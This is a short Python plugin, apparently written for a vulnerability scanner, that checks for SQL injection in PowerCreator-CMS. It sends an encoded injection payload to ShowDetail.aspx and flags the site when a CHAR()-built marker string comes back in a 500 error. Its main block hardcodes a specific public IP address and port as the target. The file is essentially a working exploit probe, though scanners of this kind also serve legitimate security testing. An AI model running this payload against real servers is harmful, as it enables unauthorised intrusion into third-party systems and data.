#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Name: app="PowerCreator-CMS"注入
#Author:404
from dummy import *


def assign(service, arg): 
    if service == fingerprint.powercreator: 
        return True, arg 
def audit(arg):
    target = arg + 'ShowDetail.aspx?ID=123%0Cand%0C1=CHAR(113)%2BCHAR(98)%2BCHAR(106)%2BCHAR(122)%2BCHAR(113)%2BCHAR(98)%2BCHAR(106)%2BCHAR(122)%2BCHAR(113)--'
    code, head, res, errcode, log= hackhttp.http(target,timeout=3)
    if  code==500 and 'qbjzqbjzq' in res: 
        security_hole(target) 
if __name__ == '__main__':
    audit(assign(fingerprint.powercreator, "http://182.243.91.5:9010/")[1])